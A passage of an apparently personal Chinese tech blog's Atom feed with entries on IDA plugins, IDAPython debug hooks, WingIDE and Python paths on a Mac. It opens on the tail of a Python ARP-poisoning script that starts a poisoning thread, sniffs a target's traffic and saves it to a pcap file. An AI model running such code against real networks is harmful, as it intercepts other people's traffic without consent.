class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] Target %s is at %s&quot;&lt;/span&gt; % (target_ip, target_mac)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 启动arp投毒线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;poison_thread.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] Starting sniffer for %d packets&quot;&lt;/span&gt; % packet_count&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bpf_filter = &lt;span class=&quot;string&quot;&gt;&quot;ip host %s&quot;&lt;/span&gt; % target_ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 将捕获到的数据包输出到文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    wrpcap(&lt;span class=&quot;string&quot;&gt;&#39;arper&#39;&lt;/span&gt;+get_current_time()+&lt;span class=&quot;string&quot;&gt;&#39;pcap&#39;&lt;/span&gt;, packets)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 还原网络配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt; KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 还原网络配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys.exit(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="blackhat" scheme="http://youyanglam.github.io/categories/blackhat/"/>
    
    
      <category term="arp" scheme="http://youyanglam.github.io/tags/arp/"/>
    
  </entry>
  
  <entry>
    <title>mac下IDA 7.0 安装keypatch插件</title>
    <link href="http://youyanglam.github.io/2019/12/24/mac%E4%B8%8BIDA-7-0-%E5%AE%89%E8%A3%85keypatch%E6%8F%92%E4%BB%B6/"/>
    <id>http://youyanglam.github.io/2019/12/24/mac%E4%B8%8BIDA-7-0-%E5%AE%89%E8%A3%85keypatch%E6%8F%92%E4%BB%B6/</id>
    <published>2019-12-24T10:36:20.000Z</published>
    <updated>2019-12-24T11:39:24.347Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、安装keystone-engine"><a href="#1、安装keystone-engine" class="headerlink" title="1、安装keystone-engine"></a>1、安装keystone-engine</h3><p>先是尝试使用“$ sudo pip install keystone-engine”安装，但是使用cmake编译（该pip命令会自动编译安装）的时候报如下错误：<br>The C compiler “/Library/Developer/CommandLineTools/usr/bin/cc” is not able to compile a simple test program<br>然后手动安装如下：</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/fjh658/keystone-engine.git</span><br><span class="line"><span class="built_in">cd</span> keystone-engine</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">sudo python setup.py install --verbose</span><br></pre></td></tr></table></figure><p>可以看到可以看到，keystone_engine被成功安装在了下面目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">running install_data</span><br><span class="line">copying src/build/llvm/lib/libkeystone.dylib -&gt; /Library/Python/2.7/site-packages/keystone</span><br><span class="line">running install_egg_info</span><br><span class="line">Writing /Library/Python/2.7/site-packages/keystone_engine-0.9.1_3-py2.7.egg-info</span><br></pre></td></tr></table></figure><h3 id="2、安装keypatch"><a href="#2、安装keypatch" class="headerlink" title="2、安装keypatch"></a>2、安装keypatch</h3><p>链接“<a href="https://github.com/keystone-engine/keypatch”，下载当前最新zip包（v2.2）。" target="_blank" rel="noopener">https://github.com/keystone-engine/keypatch”，下载当前最新zip包（v2.2）。</a><br>拷贝keypatch.py到“/Applications/IDA Pro 7.0/ida.app/Contents/MacOS/plugins”目录，重启IDA就可以了。</p><h3 id="3、结果"><a href="#3、结果" class="headerlink" title="3、结果"></a>3、结果</h3><img src="/2019/12/24/mac%E4%B8%8BIDA-7-0-%E5%AE%89%E8%A3%85keypatch%E6%8F%92%E4%BB%B6/keypatch.png" width="90%" height="90%"><img src="/2019/12/24/mac%E4%B8%8BIDA-7-0-%E5%AE%89%E8%A3%85keypatch%E6%8F%92%E4%BB%B6/keypatchv.png" width="50%" height="50%"><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p><a href="http://www.keystone-engine.org/keypatch/" target="_blank" rel="noopener">http://www.keystone-engine.org/keypatch/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、安装keystone-engine&quot;&gt;&lt;a href=&quot;#1、安装keystone-engine&quot; class=&quot;headerlink&quot; title=&quot;1、安装keystone-engine&quot;&gt;&lt;/a&gt;1、安装keystone-engine&lt;/h3&gt;&lt;p&gt;先是尝试使用“$ sudo pip install keystone-engine”安装，但是使用cmake编译（该pip命令会自动编译安装）的时候报如下错误：&lt;br&gt;The C compiler “/Library/Developer/CommandLineTools/usr/bin/cc” is not able to compile a simple test program&lt;br&gt;然后手动安装如下：&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ida" scheme="http://youyanglam.github.io/tags/ida/"/>
    
      <category term="mac" scheme="http://youyanglam.github.io/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>python命名规范</title>
    <link href="http://youyanglam.github.io/2019/12/21/python%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/"/>
    <id>http://youyanglam.github.io/2019/12/21/python%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/</id>
    <published>2019-12-21T07:12:49.000Z</published>
    <updated>2019-12-21T07:15:11.118Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/a793c0d960fe" target="_blank" rel="noopener">https://www.jianshu.com/p/a793c0d960fe</a><br><a href="https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/" target="_blank" rel="noopener">https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/a793c0d960fe&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/a793c0d960fe&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;ht
      
    
    </summary>
    
    
      <category term="python" scheme="http://youyanglam.github.io/categories/python/"/>
    
    
  </entry>
  
  <entry>
    <title>wingIDE使用记录</title>
    <link href="http://youyanglam.github.io/2019/12/19/wingIDE%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>http://youyanglam.github.io/2019/12/19/wingIDE%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2019-12-19T04:24:23.000Z</published>
    <updated>2019-12-19T04:25:58.819Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、快捷键"><a href="#1、快捷键" class="headerlink" title="1、快捷键"></a>1、快捷键</h3><p>注释/取消注释    command+：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、快捷键&quot;&gt;&lt;a href=&quot;#1、快捷键&quot; class=&quot;headerlink&quot; title=&quot;1、快捷键&quot;&gt;&lt;/a&gt;1、快捷键&lt;/h3&gt;&lt;p&gt;注释/取消注释    command+：&lt;/p&gt;
      
    
    </summary>
    
    
    
      <category term="wingIDE" scheme="http://youyanglam.github.io/tags/wingIDE/"/>
    
  </entry>
  
  <entry>
    <title>wingIDE调试idapython脚本</title>
    <link href="http://youyanglam.github.io/2019/12/18/wingIDE%E8%B0%83%E8%AF%95idapython%E8%84%9A%E6%9C%AC/"/>
    <id>http://youyanglam.github.io/2019/12/18/wingIDE%E8%B0%83%E8%AF%95idapython%E8%84%9A%E6%9C%AC/</id>
    <published>2019-12-18T14:54:39.000Z</published>
    <updated>2019-12-18T15:45:20.260Z</updated>
    
    <content type="html"><![CDATA[<p>可以使用wingIDE作为外部调试器，调试idapython脚本。具体设置见wingIDE说明文档–<br>“Table of Contents &gt;&gt; How-Tos &gt;&gt; Unmaintained How-Tos &gt;&gt; Using Wing with IDA Python”</p><a id="more"></a><h3 id="1、配置wingIDE环境，下断点"><a href="#1、配置wingIDE环境，下断点" class="headerlink" title="1、配置wingIDE环境，下断点"></a>1、配置wingIDE环境，下断点</h3><p>根据说明配置好后，用wingIDE打开目标idapython脚本，并且在目标idapython文件中下好断点</p><h3 id="2、运行idapython脚本"><a href="#2、运行idapython脚本" class="headerlink" title="2、运行idapython脚本"></a>2、运行idapython脚本</h3><p>打开ida，加载分析好的idb文件，文件菜单，运行目标idapython脚本，则触发断点，开始调试</p><h3 id="3、自己的两点总结："><a href="#3、自己的两点总结：" class="headerlink" title="3、自己的两点总结："></a>3、自己的两点总结：</h3><ul><li>wingide是调试器，ida运行idapython脚本作为客户端，调试的时候ida处于挂起状态\<img src="/2019/12/18/wingIDE%E8%B0%83%E8%AF%95idapython%E8%84%9A%E6%9C%AC/wingide_ida.png" width="90%" height="90%">可以看到ida在调试过程中挂起了<img src="/2019/12/18/wingIDE%E8%B0%83%E8%AF%95idapython%E8%84%9A%E6%9C%AC/ida.png" width="90%" height="90%"></li><li>一次调试完成后，要重新运行ida，才可以进行第二次调试，否则第二次断点断不下来</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;可以使用wingIDE作为外部调试器，调试idapython脚本。具体设置见wingIDE说明文档–&lt;br&gt;“Table of Contents &amp;gt;&amp;gt; How-Tos &amp;gt;&amp;gt; Unmaintained How-Tos &amp;gt;&amp;gt; Using Wing with IDA Python”&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="idapython" scheme="http://youyanglam.github.io/tags/idapython/"/>
    
      <category term="wingide" scheme="http://youyanglam.github.io/tags/wingide/"/>
    
  </entry>
  
  <entry>
    <title>idapython的编写</title>
    <link href="http://youyanglam.github.io/2019/12/18/idapython%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>http://youyanglam.github.io/2019/12/18/idapython%E7%9A%84%E7%BC%96%E5%86%99/</id>
    <published>2019-12-18T08:14:10.000Z</published>
    <updated>2019-12-27T07:47:53.185Z</updated>
    
    <content type="html"><![CDATA[<p>IDA Pro是一款静态反汇编的利器，具有良好的交互性、可编程性、可扩展性及对多处理器的支持。<br>对于IDA Pro的可扩展性表现在两个方面，一是采用内置的脚本语言IDC写脚本；二是采用Hex-rays提供的SDK写插件Plug-in（具体表现为plw、p64插件或者IDAPython插件）。</p><blockquote><p>IDC可以快速解决一些简单的问题，但是对于复杂的问题，就有点力不从心了。IDA SDK包文档过少，而且在调试相关的API，BUG比较多，使用比较难受，相比于起来，IDAPython可以调用IDC和IDA SDK包的所有函数，而且文档资料丰富。</p></blockquote><a id="more"></a><p><strong>简单的任务交由脚本完成，复杂的任务则需要定制满足需求的插件</strong></p><h3 id="0、先介绍一下IDA插件历史："><a href="#0、先介绍一下IDA插件历史：" class="headerlink" title="0、先介绍一下IDA插件历史："></a>0、先介绍一下IDA插件历史：</h3><p>来自（<a href="https://reverseengineering.stackovernet.com/cn/q/3050）" target="_blank" rel="noopener">https://reverseengineering.stackovernet.com/cn/q/3050）</a></p><h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p>In IDA’s documentation, there are references to modules named ida_*, as well as idc, idaapi and idautils. The former modules seem to be the lower level ones. Almost always it says that IDA Plugin SDK API wrapper: <some_module>.</some_module></p><p>I have a few specific questions about the documentation and IDAPython:</p><p>1.What is this IDA plugin SDK? Is it the C like API available in IDC?<br>2.Do the higher level API allow access to all the lower level functionalities?<br>3.What can’t I seem to load lower level modules? (When I try to import ida_lines, IDA says ImportError: No module named ida_lines)</p><h4 id="回答："><a href="#回答：" class="headerlink" title="回答："></a>回答：</h4><p>A bit of history: (aka an aging guy blabbering about)</p><p>In the old days, we didn’t have python in IDA and when an individual wanted to develop an IDA plugin he had to implement it in C and use the SDK available from hex-ray’s download center using credentials received when you purchase an IDA license. We did have, however, IDC. IDC is IDA’s old, proprietary and somewhat deprecated scripting language, this is not related to C however there is evident effort using a C-like syntax. It was commonly used in the past but IDAPython nearly replaced it completely. The only reason to see IDC now is for old code, that precedes IDAPython.</p><p>Since then, IDAPython was developed (originally as a plugin using the aforementioned SDK, and then adopted by hex-rays and made part of IDA). Up until the recent IDA 6.95, we only had a single module exposing all of IDA’s C SDK in python. That module was idaapi. idc is implementing higher level functions that were migrated from IDC into IDAPython. idautils implements some more high level functions, that weren’t there before. those are rough divisions, and not entirely accurate. The important point here is that there was a single (long) python file exposing all SDK functions (that are exposed to python using SWIG).</p><p>In IDA 6.95 we still have that, but it was also the first version to include multiple ida_* modules where are to replace the broad idaapi. idaapi is only included in 6.95 for backwards compatibility and should be expected to be dropped in IDA 7. Generally, the names of the modules (what follows the ida_ prefix) are the names of the header files in which those functions are defined. For example, ida_lines will expose functions defined in lines.h.</p><p><strong>Actual answers:</strong></p><p>1.The IDA plugin SDK is a collection of C header files and binary libraries that allow a third party develop IDA plugins using the provided API. It can be downloaded from the download center and it’s documentation is available here.<br>2.While the C SDK is pretty well documented, the IDAPython not so much. I often find browsing the SDK useful when developing IDAPython plugins, as functions are usually exposed to python but not documented or described as well as they are in the SDK. basically most of the functions correspond and you’ll find the same functions having the same name in both IDAPython and the SDK (as this is mostly automatically generated code by/for SWIG).<br>3.First guess would be you’re using an older version of IDA, where ida_* modules don’t yet exist. generally, using idaapi instead of every other module will do just fine.<br>Developing for IDA:</p><p><strong>A person interested in developing for IDA has three options:</strong></p><p>1.Writing C code using the IDA SDK and compiling it, having a plw or a p64 binary as output.<br>2.Writing IDC code. This is a decent scripting language recembling a simplified C in syntax. output would be a text file.<br>3.Writing IDAPython code. This is mostly python using the additional modules available when running from within IDA, plus a simple IDA plugin interface required to register as a plugin.</p><h3 id="1、idapython模块简单介绍"><a href="#1、idapython模块简单介绍" class="headerlink" title="1、idapython模块简单介绍"></a>1、idapython模块简单介绍</h3><p>idapython的主要模块为“idaapi.py”、“idautils.py”、“idc.py”。</p><ul><li>idaapi.py:　　    负责访问核心IDA API。</li><li>idautils.py:     提供大量的使用函数。</li><li>idc.py:          负责提供IDC中所有函数的功能。<br>以上模块在ida运行时使用内部python插件运行(IDAPython脚本会自动导入idc和idautils模块,idaapi模块,需要显式手动导入)。<br>但是这几个模块在不使用ida上下文，单独编写idapython脚本时，是无法使用的，会提示找不到模块。</li></ul><h3 id="2、使用ide单独编辑idapython时，引入idaapi等模块的设置"><a href="#2、使用ide单独编辑idapython时，引入idaapi等模块的设置" class="headerlink" title="2、使用ide单独编辑idapython时，引入idaapi等模块的设置"></a>2、使用ide单独编辑idapython时，引入idaapi等模块的设置</h3><p>在ida里写python有两个难受的地方，一个是类型推断，一个是代码补全，所以我们选择使用ide。<br><strong>在ide中脚本中要显示导入用到的模块，如“idaapi.py”、“idautils.py”、“idc.py”等，否则ide不认识相关函数，无法提示补全</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h4 id="2-1、使用wingIDE，环境变量中加入idapython相关模块的路径"><a href="#2-1、使用wingIDE，环境变量中加入idapython相关模块的路径" class="headerlink" title="2.1、使用wingIDE，环境变量中加入idapython相关模块的路径"></a>2.1、使用wingIDE，环境变量中加入idapython相关模块的路径</h4><img src="/2019/12/18/idapython%E7%9A%84%E7%BC%96%E5%86%99/idapython_modules.png" width="90%" height="90%"><h4 id="2-2、使用pycharm，环境变量中加入idapython相关模块的路径"><a href="#2-2、使用pycharm，环境变量中加入idapython相关模块的路径" class="headerlink" title="2.2、使用pycharm，环境变量中加入idapython相关模块的路径"></a>2.2、使用pycharm，环境变量中加入idapython相关模块的路径</h4><p>Preference/Settings – Project – Project Interpreter – Show All – Show paths for the selected interpreter<br><img src="/2019/12/18/idapython%E7%9A%84%E7%BC%96%E5%86%99/python27_module.png" width="90%" height="90%"></p><h3 id="3、脚本"><a href="#3、脚本" class="headerlink" title="3、脚本"></a>3、脚本</h3><p>基本的思想是 建立一个FuncPath类，该类从DBG_Hooks类继承而来，包含了调试器的钩子和一些和调试相关的功能。<br>你可以重写它的相关函数。然后建立一个钩子类对象，获取光标所在位置，枚举每一个函数，然后在函数上下断点，并设置属性为跟踪。<br>这样就可以打印出光标开始之后执行的所有函数。</p><blockquote><p><font color="red" size="3" face="华文中宋">也可以以插件的形式重写如下脚本，需要注意的是，在IDA的插件目录，所有python插件脚本的”插件继承类”的类名不能重复，否则重复类名的插件在IDA中加载不出来</font></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FuncPath</span><span class="params">(DBG_Hooks)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Our breakpoint handler</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dbg_bpt</span><span class="params">(self, tid, ea)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Hit: 0x%08x"</span> % ea</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add our function coverage debugger hook</span></span><br><span class="line">debugger = FuncPath ()</span><br><span class="line">debugger.hook()</span><br><span class="line"></span><br><span class="line">current_addr = ScreenEA()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find all functions and add breakpoints</span></span><br><span class="line"><span class="keyword">for</span> function <span class="keyword">in</span> Functions(SegStart( current_addr ), SegEnd( current_addr )):</span><br><span class="line">    AddBpt( function )</span><br><span class="line">    SetBptAttr( function, BPTATTR_FLAGS, BPT_ENABLED|BPT_TRACE)<span class="comment">#设置断点的属性为跟踪</span></span><br><span class="line"></span><br><span class="line">num_breakpoints = GetBptQty()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Set %d breakpoints."</span> % num_breakpoints</span><br></pre></td></tr></table></figure><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p>IDAPRO的python插件-IDAPython<br><a href="https://blog.csdn.net/ojshilu/article/details/12905405" target="_blank" rel="noopener">https://blog.csdn.net/ojshilu/article/details/12905405</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA Pro是一款静态反汇编的利器，具有良好的交互性、可编程性、可扩展性及对多处理器的支持。&lt;br&gt;对于IDA Pro的可扩展性表现在两个方面，一是采用内置的脚本语言IDC写脚本；二是采用Hex-rays提供的SDK写插件Plug-in（具体表现为plw、p64插件或者IDAPython插件）。&lt;/p&gt;&lt;blockquote&gt;
&lt;p&gt;IDC可以快速解决一些简单的问题，但是对于复杂的问题，就有点力不从心了。IDA SDK包文档过少，而且在调试相关的API，BUG比较多，使用比较难受，相比于起来，IDAPython可以调用IDC和IDA SDK包的所有函数，而且文档资料丰富。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="idapython" scheme="http://youyanglam.github.io/tags/idapython/"/>
    
  </entry>
  
  <entry>
    <title>Windows Memory Forensics Cheat Sheet</title>
    <link href="http://youyanglam.github.io/2019/12/17/Windows-Memory-Forensics-Cheat-Sheet/"/>
    <id>http://youyanglam.github.io/2019/12/17/Windows-Memory-Forensics-Cheat-Sheet/</id>
    <published>2019-12-17T07:45:32.000Z</published>
    <updated>2019-12-17T08:16:56.889Z</updated>
    
    <content type="html"><![CDATA[<p><strong>来自-<br>“<a href="http://cybersecqa.blogspot.com/2018/03/windows-memory-forensics-cheat-sheet.html”" target="_blank" rel="noopener">http://cybersecqa.blogspot.com/2018/03/windows-memory-forensics-cheat-sheet.html”</a></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;来自-&lt;br&gt;“&lt;a href=&quot;http://cybersecqa.blogspot.com/2018/03/windows-memory-forensics-cheat-sheet.html”&quot; target=&quot;_blank&quot; rel=&quot;noopener
      
    
    </summary>
    
    
      <category term="virus" scheme="http://youyanglam.github.io/categories/virus/"/>
    
    
      <category term="forensics" scheme="http://youyanglam.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>mac中python的安装目录</title>
    <link href="http://youyanglam.github.io/2019/12/17/mac%E4%B8%ADpython%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95/"/>
    <id>http://youyanglam.github.io/2019/12/17/mac%E4%B8%ADpython%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95/</id>
    <published>2019-12-17T03:15:10.000Z</published>
    <updated>2019-12-19T07:53:45.248Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、python3-7的安装目录"><a href="#1、python3-7的安装目录" class="headerlink" title="1、python3.7的安装目录"></a>1、python3.7的安装目录</h3><p>被安装在“usr/local/Cellar”目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7</span><br></pre></td></tr></table></figure><p>相应的，其pip等插件被安装在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/bin/pip</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pip</span><br></pre></td></tr></table></figure><a id="more"></a><p>同被安装在Cellar目录下的应用还有：yara、ruby、tree、ldid、等<br><img src="/2019/12/17/mac%E4%B8%ADpython%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95/python3_module.png" width="90%" height="90%"></p><h3 id="2、python2-7的安装目录"><a href="#2、python2-7的安装目录" class="headerlink" title="2、python2.7的安装目录"></a>2、python2.7的安装目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7</span><br></pre></td></tr></table></figure><p>但pip工具被安装在了目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Python/2.7/lib/python/site-packages/pip</span><br></pre></td></tr></table></figure><p>同被安装在该“site-packages”目录下的有很多第三方模块，如“pefile.py”、”magic.py”、“pyspider”、“scrapy”、“pyecharts”等<br>另其他一些第三方库，如“bs4”、“requests”等被安装在如下路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Python<span class="regexp">/2.7/</span>site-packages</span><br></pre></td></tr></table></figure><img src="/2019/12/17/mac%E4%B8%ADpython%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95/python27_module.png" width="90%" height="90%">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、python3-7的安装目录&quot;&gt;&lt;a href=&quot;#1、python3-7的安装目录&quot; class=&quot;headerlink&quot; title=&quot;1、python3.7的安装目录&quot;&gt;&lt;/a&gt;1、python3.7的安装目录&lt;/h3&gt;&lt;p&gt;被安装在“usr/local/Cellar”目录下&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;相应的，其pip等插件被安装在&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/bin/pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pip&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://youyanglam.github.io/categories/python/"/>
    
    
      <category term="mac" scheme="http://youyanglam.github.io/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>Swift语音学习路径</title>
    <link href="http://youyanglam.github.io/2019/12/16/Swift%E8%AF%AD%E9%9F%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/"/>
    <id>http://youyanglam.github.io/2019/12/16/Swift%E8%AF%AD%E9%9F%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/</id>
    <published>2019-12-16T09:39:06.000Z</published>
    <updated>2019-12-16T09:39:47.237Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/49328078" target="_blank" rel="noopener">https://www.zhihu.com/question/49328078</a><br><a href="https://juejin.im/post/5bd6af7451882526254942d5#heading-3" target="_blank" rel="noopener">https://juejin.im/post/5bd6af7451882526254942d5#heading-3</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/question/49328078&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.zhihu.com/question/49328078&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="Swift" scheme="http://youyanglam.github.io/tags/Swift/"/>
    
  </entry>
  
  <entry>
    <title>汇编指令含义</title>
    <link href="http://youyanglam.github.io/2019/12/11/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%90%AB%E4%B9%89/"/>
    <id>http://youyanglam.github.io/2019/12/11/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%90%AB%E4%B9%89/</id>
    <published>2019-12-11T08:44:08.000Z</published>
    <updated>2019-12-11T08:46:00.615Z</updated>
    
